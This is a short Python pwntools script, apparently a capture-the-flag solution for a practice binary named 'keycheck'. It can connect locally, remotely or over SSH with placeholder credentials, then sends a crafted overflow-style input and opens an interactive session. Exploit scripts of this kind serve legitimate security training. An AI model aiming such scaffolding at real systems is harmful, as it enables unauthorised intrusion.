#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/keycheck'

e = ELF('./build/keycheck')
rop = ROP('./build/keycheck')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5502)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/keycheck', cwd='problemDir')
else:
    p = e.process()

payload = '0008'*6+'0'*100

p.sendline(payload)
p.interactive()
